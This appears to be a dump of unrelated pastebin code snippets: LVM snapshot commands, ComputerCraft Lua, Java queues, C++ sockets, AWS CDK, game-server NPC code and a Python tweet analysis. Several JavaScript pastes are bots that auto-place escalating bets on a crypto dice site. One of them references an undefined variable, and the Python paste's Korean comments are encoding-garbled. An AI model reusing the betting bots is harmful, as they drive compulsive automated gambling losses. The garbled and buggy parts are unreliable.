sudo lvcreate -L 3M -prw -s -n migawka_small /dev/fedora/home
sudo lvdisplay /dev/fedora/migawka_small
echo -e '\033[0;32mWielkosc bufora zostala automatycznie zaokraglona do minimalnej wartosci (4MiB):\033[0m'
sudo lvdisplay /dev/fedora/migawka_small |& grep 'LV Write Access\|COW-table size'





#USUWANIE MIGAWEK:
sudo lvremove /dev/fedora/migawka_small"
D7rVbN30,ComputerCraft: Create stressometer reader,TomMo54,Lua,Monday 8th of April 2024 02:52:14 AM CDT,"-- Libs
os.loadAPI(""components_api"")

-- Constants
local stressometerSide = ""front""
local monitorSide = ""back""
local backgroundColor = colors.black

-- Init
monitor = peripheral.wrap(monitorSide)
monitor.setBackgroundColor(backgroundColor)
monitor.setTextScale(0.5)
local monitorWidth, monitorHeight = monitor.getSize()
term.redirect(monitor)

stressBar = components_api.ProgressBar:new()
stressBar.width = 10
stressBar.height = 3
stressBar.progress = 0.5

-- Main loop
while true do
    stressBar.draw(monitor)

    os.sleep(1)
end"
yY8XpQQZ,Funcion socket c++,AntonioVillanueva,C++,Monday 8th of April 2024 02:45:12 AM CDT,"std::string sendNoCurl(const std::string& host, int port, const std::string& path,bool debug=false) {
			int sock = socket(AF_INET, SOCK_STREAM, 0);
			if (sock == -1) {
				std::cerr << ""Error: Failed to create socket"" << std::endl;
				return """";
			}

			struct sockaddr_in server;
			server.sin_family = AF_INET;
			server.sin_port = htons(port);
			if (inet_pton(AF_INET, host.c_str(), &server.sin_addr) <= 0) {
				std::cerr << ""Error: Invalid address"" << std::endl;
				close(sock);
				return """";
			}

			if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
				std::cerr << ""Error: Connection failed"" << std::endl;
				close(sock);
				return """";
			}

			std::string request = ""get "" + path + "" http/1.0\r\n"";
			//std::string request = ""GET "" + path + "" HTTP/1.1\r\n"";
			request += ""Host: "" + host + ""\r\n"";
			request += ""Connection: close\r\n\r\n"";

			cout <<""DEBUG NO CURL :""<<request<<endl;
			if (send(sock, request.c_str(), request.length(), 0) != request.length()) {
				std::cerr << ""Error: Failed to send request"" << std::endl;
				close(sock);
				return """";
			}

			std::string response;
			char buffer[4096];
			int bytes_received;
			while ((bytes_received = recv(sock, buffer, sizeof(buffer), 0)) > 0) {
				response.append(buffer, bytes_received);
			}

			close(sock);

			return response;
		}"
YVHF57WV,QueueLL,qfurgie,Java,Monday 8th of April 2024 01:46:27 AM CDT,"public class QueueLL extends LinkedList
{
    public void enqueue(Node node)
    {
        addNode(node);
    }

    public Node dequeue()
    {
        return deleteNode(0);
    }

    public boolean isEmpty()
    {
        return super.isEmpty();
    }
}"
dBA3uL9T,LinkedList,qfurgie,Java,Monday 8th of April 2024 01:46:03 AM CDT,"public class LinkedList {
    private Node initNode = null;
    private Node pointer = null;
    LinkedList()
    {

    }

    public Node getFirst()
    {
        return initNode;
    }

    public void addNode(Node node)
    {
        if(isEmpty())
            initNode = node;
        else
            pointer.setPointer(node);

        pointer = node;
    }

    public Node deleteNode(String key)
    {
        Node node = initNode;
        Node prev = null;
        if (initNode == null)
            return null;

        while(!node.getKey().equals(key))
        {
            prev = node;
            node = node.getPointer();
        }

        if(prev != null)
            prev.setPointer(node.getPointer());
        else
            initNode = initNode.getPointer();

        return node;
    }
    
    public Node deleteNode(int position)
    {
        Node node = initNode;
        Node prev = null;
        for(int i = 0; i < position; i++)
        {
            prev = node;
            node = node.getPointer();
        }

        if(prev != null)
            prev.setPointer(node.getPointer());
        else
            initNode = initNode.getPointer();

        return node;
    }

    public boolean isEmpty()
    {
        return initNode == null ? true : false;
    }

    public Node getNode(String key)
    {
        Node node = initNode;
        if (isEmpty())
            return null;

        while(!node.getKey().equals(key))
        {
            node = node.getPointer();
        }

        return node;
    }

    public Node getNode(int position)
    {
        Node node = initNode;
        for(int i = 0; i < position; i++)
        {
            node = node.getPointer();
        }

        return node;
    }
}"
ybngkebS,Node,qfurgie,Java,Monday 8th of April 2024 01:45:40 AM CDT,"public class Node {
    private String key;
    private Node pointer;
    
    Node(String key, Node pointer)
    {
        this.key = key;
        this.pointer = pointer;
    }

    Node(String key)
    {
        this.key = key;
    }

    public String getKey() {
        return key;
    }

    public void setKey(String key) {
        this.key = key;
    }

    public Node getPointer() {
        return pointer;
    }

    public void setPointer(Node pointer) {
        this.pointer = pointer;
    }
}"
rSrkjeLz,QueueA,qfurgie,Java,Monday 8th of April 2024 01:45:05 AM CDT,"public class QueueA {
    private Node[] queue = new Node[100];
    private int pointer = 0;

    QueueA()
    {
        
    }

    public void enqueue(Node node)
    {
        queue[pointer] = node;
        pointer++;
    }

    public Node dequeue()
    {
        Node temp = queue[0];

        for(int i = 0; i < pointer; i++)
        {
            queue[i] = queue[i+1]; 
        }
        pointer--;

        return temp;
    }

    public boolean isEmpty()
    {
        return pointer == 0 ? true : false;
    }
}"
rDZ9MNSB,Main,qfurgie,Java,Monday 8th of April 2024 01:44:31 AM CDT,"public class Main {
       public static void main(String[] args) {
        Node a = new Node(""A"");
        Node b = new Node(""B"");
        Node c = new Node(""C"");
        Node d = new Node(""D"");

        QueueA q = new QueueA();

        q.enqueue(a);
        q.enqueue(b);
        q.enqueue(c);
        q.enqueue(d);

        System.out.println(q.dequeue().getKey());
        System.out.println(q.dequeue().getKey());
        System.out.println(q.dequeue().getKey());
        System.out.println(q.dequeue().getKey());

        QueueLL ll = new QueueLL();

        ll.enqueue(a);
        ll.enqueue(b);
        ll.enqueue(c);
        ll.enqueue(d);

        System.out.println(ll.getNode(0).getKey());
        System.out.println(ll.getNode(1).getKey());
        System.out.println(ll.getNode(2).getKey());
        System.out.println(ll.getNode(3).getKey());

        System.out.println(ll.dequeue().getKey());
        System.out.println(ll.dequeue().getKey());
        System.out.println(ll.dequeue().getKey());
        System.out.println(ll.dequeue().getKey());
       }
}"
4VDnNu46,original snowy manual,coinwalk,JavaScript,Monday 8th of April 2024 01:43:11 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/24).toFixed(8)); 
var bolux = monkey;
var tens = (monkey*10);
var twenty = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var awesome = ((Math.floor(olsenest/tens))*tens);
var olsen = 0;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var vore = olsenest;
var slumber = olsenest;
var pigzie = olsenest;
var fart = 20;
var ruth = false;
 
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
 
async function go(){
await sleep(1);
vore = document.getElementById('pct_balance').value;
if (vore>slumber){
belance = belance+bolux;
slumber = parseFloat(vore);
}
if (vore<slumber){
belance = belance-bolux;
slumber = parseFloat(vore);
}
var dog = Number((belance-olsenest).toFixed(8));
var hove = Number((vore-olsenest).toFixed(8));
var diggy = (dog-hove);
console.clear();
console.log(""profit"");
console.log(dog);
console.log(""profit ment to be"");
console.log(hove);
console.log(""difference"")
console.log(diggy);
if (diggy>0){
alert(""someone bet on your balance"");
return;
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2
    olsen = parseFloat(belance);
}
if ((belance-(bolux*12))<=0){
    bolux = monkey;
    olsen = 0;
    fart = 0;
}
if (belance>=(pigzie*24)){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
await go();
}
go();"
SjHC9AgM,Untitled,killer_ash,Go,Monday 8th of April 2024 01:40:13 AM CDT,"// dataLoader Queue
	dataLoaderQueue := sqs.NewQueue(businessStack, jsii.String(ProjectPrefix+""DataLoaderQueue""), &sqs.QueueProps{
		QueueName: jsii.String(ProjectPrefix + ""DataLoaderQueue""),
	})

	// Get a reference to an existing S3 bucket using its name
	bucket := awss3.Bucket_FromBucketName(businessStack, jsii.String(""snpos-dev""), jsii.String(""snpos-dev""))

	// Configure S3 bucket events to trigger notifications to SQS
	bucket.AddEventNotification(awss3.EventType_OBJECT_CREATED, awss3notifications.NewSqsDestination(dataLoaderQueue), &awss3.NotificationKeyFilter{
		Prefix: jsii.String(""data-loader/""),
		Suffix: jsii.String("".csv""),
	})

	// Handler for data loader
	dataLoaderLambda := awscdklambdago.NewGoFunction(businessStack, jsii.String(ProjectPrefix+""DataLoaderLambda""), &awscdklambdago.GoFunctionProps{
		FunctionName: jsii.String(ProjectPrefix + ""DataLoaderLambda""),
		Description:  jsii.String(""Loads data to dynamodb through CSV files""),
		Entry:        jsii.String(""../lambda/data-loader""),
		Runtime:      awslambda.Runtime_PROVIDED_AL2(),
		MemorySize:   jsii.Number(256),
		Role:         role,
		Environment:  lambdaEnvironmentVariable,
		// LogRetention: awslogs.RetentionDays_ONE_WEEK,
	})

	dataLoaderEventSource := awslambdaeventsources.NewSqsEventSource(dataLoaderQueue, &awslambdaeventsources.SqsEventSourceProps{
		BatchSize: jsii.Number(5),
	})

	dataLoaderLambda.AddEventSource(dataLoaderEventSource)"
Bv2hs1MA,trial,coinwalk,JavaScript,Monday 8th of April 2024 01:22:13 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/64).toFixed(8)); 
var bolux = monkey;
var tens = (monkey*10);
var twenty = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var awesome = ((Math.floor(olsenest/tens))*tens);
var olsen = 0;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var vore = olsenest;
var slumber = olsenest;
var pigzie = olsenest;
var fart = 20;
var ruth = false;
 
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
 
async function go(){
await sleep(1);
vore = document.getElementById('pct_balance').value;
if (vore>slumber){
belance = belance+bolux;
slumber = parseFloat(vore);
}
if (vore<slumber){
belance = belance-bolux;
slumber = parseFloat(vore);
}
var dog = Number((belance-olsenest).toFixed(8));
var hove = Number((vore-olsenest).toFixed(8));
var diggy = (dog-hove);
console.clear();
console.log(""profit"");
console.log(dog);
console.log(""profit ment to be"");
console.log(hove);
console.log(""difference"")
console.log(diggy);
if (diggy>0){
alert(""someone bet on your balance"");
return;
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2
    olsen = parseFloat(belance);
}
if ((((belance/4)-bolux)<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 0;
}
if (((belance/8)-monkey)<=0){
console.log(""lost no chicken dinner"");
return;
}
if (belance>=(pigzie*24)){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
await go();
}
go();"
NjUZrQ0t,lol,coinwalk,JavaScript,Monday 8th of April 2024 01:20:12 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/64).toFixed(8)); 
var bolux = monkey;
var tens = (monkey*10);
var twenty = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var awesome = ((Math.floor(olsenest/tens))*tens);
var olsen = 0;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var vore = olsenest;
var slumber = olsenest;
var pigzie = olsenest;
var fart = 20;
var ruth = false;
 
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
 
async function go(){
await sleep(1);
vore = document.getElementById('pct_balance').value;
if (vore>slumber){
belance = belance+bolux;
slumber = parseFloat(vore);
}
if (vore<slumber){
belance = belance-bolux;
slumber = parseFloat(vore);
}
var dog = Number((belance-olsenest).toFixed(8));
var hove = Number((vore-olsenest).toFixed(8));
var diggy = (dog-hove);
console.clear();
console.log(""profit"");
console.log(dog);
console.log(""profit ment to be"");
console.log(hove);
console.log(""difference"")
console.log(diggy);
if (diggy>0){
alert(""someone bet on your balance"");
return;
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2
    olsen = parseFloat(belance);
}
if ((((belance/4)-bolux)<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 0;
}
if (((balance/8)-monkey)<=0){
console.log(""lost no chicken dinner"");
return;
}
if (belance>=(pigzie*24)){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
await go();
}
go();"
s54Qp4j8,finally a program works snowybot,coinwalk,JavaScript,Monday 8th of April 2024 12:37:53 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var monkey = Number((olsenest/1000).toFixed(8)); 
var bolux = monkey;
var tens = (monkey*10);
var twenty = (monkey*10);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var awesome = ((Math.floor(olsenest/tens))*tens);
var olsen = 0;
var upper = 6.9;
var downer = 2.9;
var belance = olsenest;
var vore = olsenest;
var slumber = olsenest;
var pigzie = olsenest;
var fart = 2;
var ruth = false;
 
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
 
 
async function go(){
await sleep(1);
vore = document.getElementById('pct_balance').value;
if (vore>slumber){
belance = belance+bolux;
slumber = parseFloat(vore);
}
if (vore<slumber){
belance = belance-bolux;
slumber = parseFloat(vore);
}
var dog = Number((belance-olsenest).toFixed(8));
var hove = Number((vore-olsenest).toFixed(8));
var diggy = (dog-hove);
console.clear();
console.log(""profit"");
console.log(dog);
console.log(""profit ment to be"");
console.log(hove);
console.log(""difference"")
console.log(diggy);
if (diggy>0){
alert(""someone bet on your balance"");
return;
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2
    olsen = parseFloat(belance);
}
if ((belance>=(awesome+(tens*fart)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 2;
    awesome = ((Math.floor(belance/tens))*tens);
}
if (((belance-(bolux*200))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 1;
    awesome = ((Math.floor(belance/tens))*tens);
}
if (belance>=(pigzie*24)){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
await go();
}
go();"
K14ZEYv1,LetterQuest Done,XConquer,C#,Monday 8th of April 2024 12:31:00 AM CDT,"Go to NPCS.cs Find : case 131313:
and replace the npcs for this :

#region ConquerLetterQuest
                    case 131313:
                        {
                            switch (npcRequest.OptionID)
                            {
                                case 0:
                                    {
                                        if (client.Entity.ConquerLetterQuestCan == 2)
                                        {
                                            dialog.Text(""You "" + client.Entity.Name + ""! u already Finish quest today, please try again Tomorrow!"");
                                            dialog.Option(""Uhh Okay okay."", 255);
                                            dialog.Option(""Give me Awards."", 2);
                                            dialog.Avatar(1211);
                                        }
                                        else  if (client.Entity.ConquerLetterQuestCan == 1)
                                        {
                                          
                                           
                                            dialog.Text(""You "" + client.Entity.Name + ""! u already in the Quest.. hurry up rest time [ "" + string.Format(""You have {0} Minutes to Hunting Letter."", (client.Entity.ConquerLetterQuest.AddMinutes(120) - DateTime.Now).TotalMinutes) + ""]"");
                                            dialog.Option(""Uhh Okay okay."", 255);
                                            dialog.Option(""Give me Awards."", 2);
                                            dialog.Avatar(1211);

                                        }
                                        else
                                        {
                                            dialog.Text(""Hi "" + client.Entity.Name + ""!, Iam letter man, So you can help me?"");
                                            dialog.Option(""Yes,sure."", 1);
                                            dialog.Option(""Give me Awards."", 2);
                                            dialog.Option(""Sorry, Ican't."", 255);
                                            dialog.Avatar(1211);
                                            dialog.Send();
                                        }
                                        break;
                                    }
                                case 1:
                                    {
                                        dialog.Text(""Thank you for help"" + client.Entity.Name + ""!, ok go to and kill TwinCity monster to attend this later [C,O,N,Q,U,E,R] If you are lucky you will get No. 7 in order to maximize your profits."");
                                        dialog.Option(""Lets Go."", 5);
                                        dialog.Option(""Sorry, Ican't"", 255);
                                        dialog.Avatar(1211);
                                        dialog.Send();
                                        break;
                                    }
                                case 5:
                                    {
                                        dialog.Text(""u Now has been start the Conquer Letter Quest, remember u only have 2:00:00 Hours to complete it, if u cant u need to come back Tomorrow try Again"");
                                        dialog.Option(""Ok"",255);
                                        client.Entity.ConquerLetterQuest = DateTime.Now;
                                        client.Entity.ConquerLetterQuestCan = 1;
                                        break;
                                    }
                                case 2:
                                    {
                                        if (client.Entity.Level >= 30)//C
                                        {
                                            if (client.Entity.Quest == 0)//C
                                            {
                                                dialog.Text(""Good job man you are strong man ,So What brought?"");
                                                dialog.Option(""U,M,B,R,A,C,O,N,Q,U,E,R"", 3);
                                                dialog.Option(""U,M,B,R,A,C,O,N,Q,U,E,R,24"", 4);
                                                dialog.Option(""Has not brought anything."", 255);
                                                dialog.Send();
                                                break;
                                            }
                                            else
                                            {
                                                dialog.Text(""You already finished this quest 1 time today come again tomorow"");
                                                dialog.Option(""Oh,sorry."", 255);
                                                dialog.Send();
                                                break;
                                            }
                                        }
                                        else
                                        {
                                            dialog.Text(""You need to be atleast level 30 so you can start the quest"");
                                            dialog.Option(""Oh,sorry."", 255);
                                            dialog.Send();
                                        }
                                        break;
                                    }
                                case 3:
                                    {
                                        if (client.Inventory.Contains(7112140, 1))//C
                                            if (client.Inventory.Contains(7112150, 1))//O
                                                if (client.Inventory.Contains(7112160, 1))//N
                                                    if (client.Inventory.Contains(7112170, 1))//Q
                                                        if (client.Inventory.Contains(7112180, 1))//U
                                                            if (client.Inventory.Contains(7112190, 1))//E
                                                                if (client.Inventory.Contains(7112200, 1))//R
                                                               
                                                                        if (client.Inventory.Contains(7112230, 1))//U
                                                                            if (client.Inventory.Contains(7112240, 1))//M
                                                                                if (client.Inventory.Contains(7112250, 1))//B
                                                                                    if (client.Inventory.Contains(7112260, 1))//R
                                                                                        if (client.Inventory.Contains(7112270, 1))//A
                                                                                        {
                                                                    client.Inventory.Remove(7112140, 1);
                                                                    client.Inventory.Remove(7112150, 1);
                                                                    client.Inventory.Remove(7112160, 1);
                                                                    client.Inventory.Remove(7112170, 1);
                                                                    client.Inventory.Remove(7112180, 1);
                                                                    client.Inventory.Remove(7112190, 1);
                                                   
                                                                                            client.Inventory.Remove(7112230, 1);
                                                                                            client.Inventory.Remove(7112240, 1);
                                                                                            client.Inventory.Remove(7112250, 1);
                                                                                            client.Inventory.Remove(7112260, 1);
                                                                                            client.Inventory.Remove(7112270, 1);
                                                                                            client.Entity.DrachmaOfficer += 5;
                                                                    client.Entity.ConquerLetterQuestCan = 2;
                                                                 
                                                                    COServer.Network.PacketHandler.WorldMessage(""Congratulations! "" + client.Entity.Name + ""! Give Letter U,M,B,R,A,C,O,N,Q,U,E,R And Get 5 Drachma Points"");
                                                                }
                                                                else
                                                                {
                                                                    dialog.Text(""You don't have letter [U,M,B,R,A,C,O,N,Q,U,E,R] or you done the quest 1 time today"");
                                                                    dialog.Option(""Ahh sorry."", 255);
                                                                }
                                        break;
                                    }
                                case 4:
                                    {
                                        if (client.Inventory.Contains(7112150, 1))//O
                                            if (client.Inventory.Contains(7112160, 1))//N
                                                if (client.Inventory.Contains(7112170, 1))//Q
                                                    if (client.Inventory.Contains(7112180, 1))//U
                                                        if (client.Inventory.Contains(7112190, 1))//E
                                                            if (client.Inventory.Contains(7112200, 1))//R
                                                                if (client.Inventory.Contains(7112210, 1))//24
                                                            
                                                                        if (client.Inventory.Contains(7112230, 1))//U
                                                                            if (client.Inventory.Contains(7112240, 1))//M
                                                                                if (client.Inventory.Contains(7112250, 1))//B
                                                                                    if (client.Inventory.Contains(7112260, 1))//R
                                                                                        if (client.Inventory.Contains(7112270, 1))//A
                                                                                        {
                                                                    client.Inventory.Remove(7112140, 1);
                                                                    client.Inventory.Remove(7112150, 1);
                                                                    client.Inventory.Remove(7112160, 1);
                                                                    client.Inventory.Remove(7112170, 1);
                                                                    client.Inventory.Remove(7112180, 1);
                                                                    client.Inventory.Remove(7112190, 1);
                                                                    client.Inventory.Remove(7112200, 1);
                                                                    client.Inventory.Remove(7112210, 1);

                                                                              
                                                                                            client.Inventory.Remove(7112230, 1);
                                                                                            client.Inventory.Remove(7112240, 1);
                                                                                            client.Inventory.Remove(7112250, 1);
                                                                                            client.Inventory.Remove(7112260, 1);
                                                                                            client.Inventory.Remove(7112270, 1);
                                                                                            client.Entity.DrachmaOfficer += 50;
                                                                    client.Entity.ConquerLetterQuestCan = 2;
                                                                    COServer.Network.PacketHandler.WorldMessage(""Congratulations! "" + client.Entity.Name + ""! Give Letter U,M,B,R,A,C,O,N,Q,U,E,R,24 And Get 50 Drachma Points"");
                                                                }
                                                                else
                                                                {
                                                                    dialog.Text(""You don't have letter [U,M,B,R,A,C,O,N,Q,U,E,R,24] or you done the quest 1 time today"");
                                                                    dialog.Option(""Ahh sorry."", 255);
                                                                }
                                        break;

                                    }
                            }
                            break;
                        }
                    #endregion"
dL7pug6F,Stargate Cargo Upper Distributer,Alexr360,Lua,Monday 8th of April 2024 12:27:04 AM CDT,"local modem = peripheral.wrap(""top"") or error(""No modem attached"", 0)
modem.open(43) -- Open 43 so we can receive replies

-- And wait for a reply
local event, side, channel, replyChannel, message, distance
repeat
    event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
until channel == 12

-- Process the received message based on its content
if message == ""Iron"" then
    modem.transmit(12, 46, ""Preparing Package..."")
    print(""Starting Drop..."")
    redstone.setOutput(""front"", true)

    os.sleep(1)

    print(""Stoping Drop..."")
    redstone.setOutput(""front"", false)
    
    os.sleep(3)
    modem.transmit(12, 46, ""Drop-Ready"")
end

shell.run(""startup"")"
KWNcAc7f,Untitled,NotoriousH2,Python,Monday 8th of April 2024 12:23:54 AM CDT,"# Ìä∏ÎüºÌîÑ Ï†Ñ ÎåÄÌÜµÎ†πÏùò Ìä∏Ïúó Î™®ÏùåÏùÑ Î∂àÎü¨ÏòµÎãàÎã§.
from tweets import trump_tweets

# Î∂ÑÏÑùÏóêÏÑú Ï†úÏô∏ÌïòÍ∏∞ ÏúÑÌïú Î∂àÏö©Ïñ¥ Î™®ÏùåÏùÑ Î∂àÎü¨ÏòµÎãàÎã§.
from stopwords import stopwords

# Í∑∏ÎûòÌîÑÏóê ÌïÑÏöîÌïú ÎùºÏù¥Î∏åÎü¨Î¶¨Î•º Î∂àÎü¨ÏòµÎãàÎã§. 
import matplotlib.pyplot as plt

# Îã®Ïñ¥Íµ¨Î¶ÑÏóê ÌïÑÏöîÌïú ÎùºÏù¥Î∏åÎü¨Î¶¨Î•º Î∂àÎü¨ÏòµÎãàÎã§. 
import numpy as np
from PIL import Image
from wordcloud import WordCloud

# ÌäπÌôîÎêú Ïª®ÌÖåÏù¥ÎÑà Î™®ÎìàÏóêÏÑú Ïàò ÏÑ∏Í∏∞Î•º ÎèïÎäî Î©îÏÜåÎìúÎ•º Î∂àÎü¨ÏòµÎãàÎã§.
from collections import Counter

# Î¨∏ÏûêÏó¥ Î™®ÎìàÏóêÏÑú ÌäπÏàòÎ¨∏ÏûêÎ•º Ï≤òÎ¶¨Î•º ÎèïÎäî Î©îÏÜåÎìúÎ•º Î∂àÎü¨ÏòµÎãàÎã§. 
from string import punctuation

# ÏóòÎ¶¨Ïä§ÏóêÏÑú ÌååÏùº ÏÜ°Ï∂úÏóê ÌïÑÏöîÌïú Ìå®ÌÇ§ÏßÄÎ•º Î∂àÎü¨ÏòµÎãàÎã§. 
from elice_utils import EliceUtils
elice_utils = EliceUtils()


# Îç∞Ïù¥ÌÑ∞ Ï†ÑÏ≤òÎ¶¨Î•º Ïã§ÌñâÌï©ÎãàÎã§. 
def preprocess_text(text):
    # Î∂ÑÏÑùÏùÑ ÏúÑÌï¥ textÎ•º Î™®Îëê ÏÜåÎ¨∏ÏûêÎ°ú Î≥ÄÌôòÌï©ÎãàÎã§.
    text = text.lower()
    
     # @ÏôÄ #ÏùÑ Ï†úÏô∏Ìïú ÌäπÏàòÎ¨∏ÏûêÎ°ú Ïù¥Î£®Ïñ¥ÏßÑ Î¨∏ÏûêÏó¥ symbolsÎ•º ÎßåÎì≠ÎãàÎã§.
    symbols = punctuation.replace('@', '').replace('#', '')
    

    # ÌäπÏàòÎ¨∏Ïûê Ï†úÍ±∞ÌïòÍ∏∞
    for symbol in symbols:
        text = text.replace(symbol, '')

    # split Í≤∞Í≥º return
    return text.split()

    

# Ìï¥ÏãúÌÉúÍ∑∏ÏôÄ ÌÇ§ÏõåÎìúÎ•º Ï∂îÏ∂úÌï©ÎãàÎã§. 
def analyze_text(words):
    # ÌÇ§ÏõåÎìú, Ìï¥ÏãúÌÉúÍ∑∏, Î©òÏÖòÏùÑ Ï†ÄÏû•Ìï† Î¶¨Ïä§Ìä∏Î•º Í∞ÅÍ∞Å ÏÉùÏÑ±Ìï©ÎãàÎã§.
    keywords, hashtags, mentions = [], [], []
    
    for word in words:
        if word.startswith('@'):
            mentions.append(word[1:])
            keywords.append(word[1:])

        elif word.startswith('#'):
            hashtags.append(word[1:])
            keywords.append(word[1:])

        else:
            keywords.append(word)
    
    return keywords, hashtags, mentions


def filter_by_month(tweet_data, month):
    # monthÎ•º Î¨∏ÏûêÏó¥Î°ú Î∞îÍæº month_stringÏùÑ ÏÑ†Ïñ∏Ìï©ÎãàÎã§.
    # Ïù¥ Îïå Ìïú ÏûêÎ¶¨ ÏàòÎäî ÏïûÏóê '0'ÏùÑ ÎÑ£Ïñ¥Ï§çÎãàÎã§. (ex: 1 => '01')
    month_string = '0' + str(month) if month < 10 else str(month)
    
    # ÏÑ†ÌÉùÌïú Îã¨Ïùò Ìä∏ÏúóÏùÑ filtered_tweetsÏóê Ï†ÄÏû•Ìï©ÎãàÎã§.
    filtered_tweets = []
    for tweet in tweet_data:
        tweet_month = tweet[0].split('-')[0]
        if tweet_month == month_string:
            filtered_tweets.append(tweet[1])

    return filtered_tweets
#tweet_data = [('01-19-2017 20:13:57', 'On my way! #Inauguration2017 https://t.co/hOuMbxGnpe')]

    # Ìä∏ÏúóÏùò ÎÇ†ÏßúÍ∞Ä ÏÑ†ÌÉùÌïú Îã¨Ïóê ÏÜçÌï¥ ÏûàÏúºÎ©¥ Ìä∏ÏúóÏùò ÎÇ¥Ïö©ÏùÑ filtered_tweetsÏóê Ï∂îÍ∞ÄÌï©ÎãàÎã§.
    


# Ìä∏Ïúó ÌÜµÍ≥ÑÎ•º Ï∂úÎ†•Ìï©ÎãàÎã§.
def show_stats():
    keyword_counter = Counter()
    hashtag_counter = Counter()
    mention_counter = Counter()
    
    for _, tweet in trump_tweets:
        keyward, hashtag, mention = analyze_text(preprocess_text(tweet))
        keyword_counter += Counter(keyward)
        hashtag_counter += Counter(hashtag)
        mention_counter += Counter(mention)
    
    # Í∞ÄÏû• ÎßéÏù¥ Îì±Ïû•Ìïú ÌÇ§ÏõåÎìú, Ìï¥ÏãúÌÉúÍ∑∏, Î©òÏÖòÏùÑ Ï∂úÎ†•Ìï©ÎãàÎã§.
    top_ten = hashtag_counter.most_common(10)
    for hashtag, freq in top_ten:
        print('{}: {}Ìöå'.format(hashtag, freq))


# Ïõî Î≥Ñ Ìä∏Ïúó Í∞úÏàòÎ•º Î≥¥Ïó¨Ï£ºÎäî Í∑∏ÎûòÌîÑÎ•º Ï∂úÎ†•Ìï©ÎãàÎã§. 
def show_tweets_by_month():
    months = range(1, 13)
    num_tweets = [len(filter_by_month(trump_tweets, month)) for month in months]
    
    plt.bar(months, num_tweets, align='center')
    plt.xticks(months, months)
    
    plt.savefig('graph.png')
    elice_utils = EliceUtils()
    elice_utils.send_image('graph.png')


# wordcloud Ìå®ÌÇ§ÏßÄÎ•º Ïù¥Ïö©Ìï¥ Ìä∏ÎüºÌîÑ ÎåÄÌÜµÎ†π Ïã§Î£®Ïó£ Î™®ÏñëÏùò Îã®Ïñ¥Íµ¨Î¶ÑÏùÑ ÏÉùÏÑ±Ìï©ÎãàÎã§.
def create_word_cloud():
    
    counter = Counter()
    for _, tweet in trump_tweets:
        keywords, _, _ = analyze_text(preprocess_text(tweet))
        counter += Counter(keywords)
    
    trump_mask = np.array(Image.open('trump.png'))
    cloud = WordCloud(background_color='white', mask=trump_mask)
    cloud.fit_words(counter)
    cloud.to_file('cloud.png')
    elice_utils.send_image('cloud.png')


# ÏûÖÎ†•Í∞íÏóê Îî∞Îùº Ï∂úÎ†•Ìï† Í≤∞Í≥ºÎ•º ÏÑ†ÌÉùÌï©ÎãàÎã§. 
def main(code=1):
    # Í∞ÄÏû• ÎßéÏù¥ Îì±Ïû•Ìïú ÌÇ§ÏõåÎìú, Ìï¥ÏãúÌÉúÍ∑∏, Î©òÏÖòÏùÑ Ï∂úÎ†•Ìï©ÎãàÎã§.
    if code == 1:
        show_stats()
    
    # Ìä∏ÎüºÌîÑ Ï†Ñ ÎåÄÌÜµÎ†πÏùò ÏõîÎ≥Ñ Ìä∏Ïúó Í∞úÏàò Í∑∏ÎûòÌîÑÎ•º Ï∂úÎ†•Ìï©ÎãàÎã§.
    if code == 2:
        show_tweets_by_month()
    
    # Ìä∏ÎüºÌîÑ Ï†Ñ ÎåÄÌÜµÎ†πÏùò Ìä∏Ïúó ÌÇ§ÏõåÎìúÎ°ú Îã®Ïñ¥Íµ¨Î¶ÑÏùÑ Í∑∏Î¶ΩÎãàÎã§.
    if code == 3:
        create_word_cloud()


# main Ìï®ÏàòÎ•º Ïã§ÌñâÌï©ÎãàÎã§. 
if __name__ == '__main__':
